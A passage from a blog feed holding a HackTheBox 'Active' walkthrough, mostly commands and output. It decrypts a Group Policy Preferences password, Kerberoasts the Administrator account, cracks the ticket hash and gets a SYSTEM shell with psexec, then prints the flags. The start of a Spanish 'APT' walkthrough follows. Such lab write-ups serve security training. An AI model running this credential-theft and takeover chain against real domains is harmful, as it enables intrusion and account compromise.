<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 05:38:11 2018	Groups.xml
</code></pre></div></div>

<ul>
  <li>Now download <code class="language-plaintext highlighter-rouge">Groups.xml</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">--download</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
<span class="o">[</span>+] Starting download: Replication<span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml <span class="o">(</span>533 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguelrega7/Hackthebox/Active/nmap/10.10.10.100-Replication_active.htb_Policies_<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>_MACHINE_Preferences_Groups_Groups.xml
</code></pre></div></div>

<ul>
  <li>It’s a password.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/bin/cat groups.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2018-07-18 20:46:06"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="o">&gt;</span>&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span>/&gt;&lt;/User&gt;
&lt;/Groups&gt;
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</code></p>

<ul>
  <li>We can use <code class="language-plaintext highlighter-rouge">ggp-decrypt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gpp-decrypt <span class="s1">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span>
GPPstillStandingStrong2k18
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">GPPstillStandingStrong2k18</code></p>

<ul>
  <li>And a user.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">userName="active.htb\SVC_TGS"</code></p>

<ul>
  <li>Credentials are correct.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18
</code></pre></div></div>

<ul>
  <li>Now that we have credentials we can view other resources.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--shares</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.100    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.100    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.10.100    445    DC               IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ   
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Users                                             	READ ONLY	
	.<span class="se">\U</span>sers<span class="se">\*</span>
	dw--w--w--                0 Sat Jul 21 09:39:20 2018	<span class="nb">.</span>
	dw--w--w--                0 Sat Jul 21 09:39:20 2018	..
	dr--r--r--                0 Mon Jul 16 05:14:21 2018	Administrator
	dr--r--r--                0 Mon Jul 16 16:08:56 2018	All Users
	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Default
	dr--r--r--                0 Mon Jul 16 16:08:56 2018	Default User
	fr--r--r--              174 Mon Jul 16 16:01:17 2018	desktop.ini
	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Public
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	SVC_TGS
</code></pre></div></div>

<ul>
  <li>We can see the <code class="language-plaintext highlighter-rouge">SVC_TGS</code> directory.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Users                                             	READ ONLY	
	.<span class="se">\U</span>sersSVC_TGS<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	..
	dr--r--r--                0 Sat Jul 21 10:14:20 2018	Contacts
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	Desktop
	dr--r--r--                0 Sat Jul 21 10:14:28 2018	Downloads
	dr--r--r--                0 Sat Jul 21 10:14:50 2018	Favorites
	dr--r--r--                0 Sat Jul 21 10:15:00 2018	Links
	dr--r--r--                0 Sat Jul 21 10:15:23 2018	My Documents
	dr--r--r--                0 Sat Jul 21 10:15:40 2018	My Music
	dr--r--r--                0 Sat Jul 21 10:15:50 2018	My Pictures
	dr--r--r--                0 Sat Jul 21 10:16:05 2018	My Videos
	dr--r--r--                0 Sat Jul 21 10:16:20 2018	Saved Games
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	Searches
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS/Desktop
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Users                                             	READ ONLY	
	.<span class="se">\U</span>sersSVC_TGS<span class="se">\D</span>esktop<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	..
	fw--w--w--               34 Sat Jan 28 17:14:19 2023	user.txt
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Download the <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--download</span> Users/SVC_TGS/Desktop/user.txt
<span class="o">[</span>+] Starting download: Users<span class="se">\S</span>VC_TGS<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt <span class="o">(</span>34 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguelrega7/Hackthebox/Active/content/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mv </span>10.10.10.100-Users_SVC_TGS_Desktop_user.txt user.txt
❯ /usr/bin/cat user.txt
b7d2dfba479b6ffa88442b747b15b65d
</code></pre></div></div>

<h2 id="root">Root</h2>

<ul>
  <li>We need more information about the DC.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS%GPPstillStandingStrong2k18"</span> 10.10.10.100
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
rpcclient <span class="nv">$&gt;</span>
</code></pre></div></div>

<ul>
  <li>Groups.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient <span class="nv">$&gt;</span> 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient <span class="nv">$&gt;</span> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account <span class="k">for </span>administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	sáb, 28 ene 2023 17:14:29 CST
	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
	Kickoff Time             :	mié, 31 dic 1969 18:00:00 CST
	Password last <span class="nb">set </span>Time   :	mié, 18 jul 2018 14:06:40 CDT
	Password can change Time :	jue, 19 jul 2018 14:06:40 CDT
	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000003f
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient <span class="nv">$&gt;</span> 

</code></pre></div></div>

<ul>
  <li>More information about the users.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS%GPPstillStandingStrong2k18"</span> 10.10.10.100
rpcclient <span class="nv">$&gt;</span> querydispinfo
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: <span class="o">(</span>null<span class="o">)</span>
rpcclient <span class="nv">$&gt;</span>
</code></pre></div></div>

<ul>
  <li>Create a file.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /bin/cat users.txt
SVC_TGS
</code></pre></div></div>

<h2 id="as-rep-roasting">AS-REP Roasting</h2>

<ul>
  <li>To do this your clock has to be synchronized with the dc clock, if you ever have to do it you can use this command.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">ntpdate 10.10.10.100</code></p>

<ul>
  <li>
    <p>We could do this if we do not have credentials but since we have the password it was not necessary but if we did not have it we could have requested a ticket but it is not possible.</p>
  </li>
  <li>
    <p>Here you have a link where they explain it very well.</p>
  </li>
  <li>
    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/</a></p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetNPUsers.py active.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span>-] User SVC_TGS doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>The port 88 is open so we can use kerbrute as well.</p>
  </li>
  <li>
    <p><a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./kerbrute_linux_amd64

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 01/28/23 - Ronnie Flathers @ropnop

This tool is designed to assist <span class="k">in </span>quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute <span class="o">[</span><span class="nb">command</span><span class="o">]</span>

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user<span class="s1">'s password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
</span></code></pre></div></div>

<ul>
  <li>We can obtain a ticket for the administrator user.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938
</code></pre></div></div>

<ul>
  <li>We have the admin user hash, let’s crack it.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="nt">-request</span>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938             



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator<span class="k">*</span><span class="nv">$4e5088992b25d09403d37d2e9ef6e72a$8c895d03044c58eb7c992d6c70f3ab24ae8c6716a2cdae892b7cbc67ba09818f3f5a04b8f0e37ffd45cc6455b2ac76ac7d50fc53df376ee22d951c44e997ab8ae4f139753e74d224d95c01d3fad9788e0a1a9413ad3782ae99921e681c6400e71a786082ec52549c445f7fbc352f12650a909f01f8d0f9a7e1da875ed9521df6643c80fb2454123e58caf3113ee8cae08b9ee296de7beccb621c3d3905908291faa105879c4f13b9c3e2598e3a4631c25a6d302a6a4b07f6de66d2cfba70cdba9b194889283cde2ee9dae39b9f22c94e07e3aca3f155c37b08278c02a32b75b96cbc3abf08f86a65b22f08c56d17e86faf42ecaf06a17f8f30c34ccdac2fafe6956f852cb07a6aa8297bd34d491b2c94f3180d68d3b0753a69e6a9e3be6f4afd99f6119c4c594456bbe92ca29796ce6b3b5ce23ed6c6718411301dc2feb0ab6f43059cdc09149f22c2ccc183554dc527329a6ecc3fa3024da5b95cbf9df28c6cd02221c99719446f6a78d56a9424eb642221d57df9cea4ddd251a576a1bc352d5ef78a617cd9e26d7fcaec60839a21555be11429568f5e6c1baa5eb8a7ad3cec87d51e0ac3485e8b721377b2f3e12a52e953fb27d4b94b6a5c73452d6ae6b0b5d4d8730114a5aff717f386663eb10d39451097ea081f42595fa0dd1e2aefe2bf08e5884f5615ede70728c6c1bb33fbb39e4bcfba746bf760f16f14ef60162b83c7f835a46fb61b9e73ed119e46ae1753e9c11414d4f20fef2527e2ca6fa95889c1f4d6ff3de678455db626f0dead28d9d0cdf566074e3fd03378283bcb3a0148f997f2f63c53113d700ef7c6d2613d62a16ecd4145aec9eb40a948f1b98c161657b2a114e550e3ee277906f8458d160b2ea3fbdf17eff96b2ca126f7850feaa0885d4f1518a43478ded45b70f40bae58349147681457d22b4cd5aeaaf32632df697914ec300daec74c8d9dbbcc25581c9b2c795598b1a9a34a17a6f8f835413fbd6ca1173935ccd4242c4fa7cf9e90630646cff5ab81cadb0d63259cb471e0e296a96b6461c120efcdfa22e93654cbe537f1b98be8b27c046343263b7335434b8bfb852e8ea1cf760945df81b1701632f8fa2c1da5721cf17e159dd03aa9b55d8a605fb907a341e361280950fa58a1015e4bb5668721cd2259a69dcbd7ab3c0bfcf92cab7a81f85f5bb67125f046ec6bc63d30741cde6792e165ecae26c8eb8ae29ee490b3b0100c98282b6c90ad39ed7783607916c344406667</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Ticketmaster1968 <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:26 DONE <span class="o">(</span>2023-01-28 18:58<span class="o">)</span> 0.03752g/s 395402p/s 395402c/s 395402C/s Tiffani1432..Tiago_18
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<ul>
  <li>The password is correct.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\A</span>dministrator:Ticketmaster1968 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Now we can have a shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.100.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file AteihbIx.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.100.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service nMsa on 10.10.10.100.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service nMsa.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 6.1.7601]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">hostname
</span>DC

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
385fab9ee1161ce755cbbffe84ed6701

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - APT (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html" rel="alternate" type="text/html" title="HackTheBox - APT (insane)" /><published>2024-04-14T00:00:00-06:00</published><updated>2024-04-14T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/bbf0ca0388599663e0d8b6955a0760d3.png" />
</p>

<ul>
  <li>En este post vamos a estar haciendo la maquina APT de la plataforma de Hack The Box donde mediante una enumeración por RPC encontramos que se esta empleando IPV6 en la maquina victima a partir de eso conoceremos la dirección IP y comenzaremos a enumerar por smb donde encontraremos un .zip que vamos a crackear, vamos a estar empleando kerbrute para validar usuarios, vamos a leer registros de la maquina, vamos a hacer un bypass al antivirus para poder correr el winpeas y en esta maquina vamos a estar jugando con un hash NTLMv1.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135 10.129.96.60 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 19:00 CST
Nmap scan report <span class="k">for </span>10.129.96.60
Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-title: Gigantic Hosting | Home
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto que esta corriendo un servicio <strong>http</strong> eso significa que hay una pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span> <span class="o">-</span><span class="n">v</span>
<span class="no">WhatWeb</span> <span class="n">report</span> <span class="k">for</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span>
<span class="no">Status</span>    <span class="p">:</span> <span class="mi">200</span> <span class="no">OK</span>
<span class="no">Title</span>     <span class="p">:</span> <span class="no">Gigantic</span> <span class="no">Hosting</span> <span class="o">|</span> <span class="no">Home</span>
<span class="no">IP</span>        <span class="p">:</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span>
<span class="no">Country</span>   <span class="p">:</span> <span class="no">RESERVED</span><span class="p">,</span> <span class="no">ZZ</span>

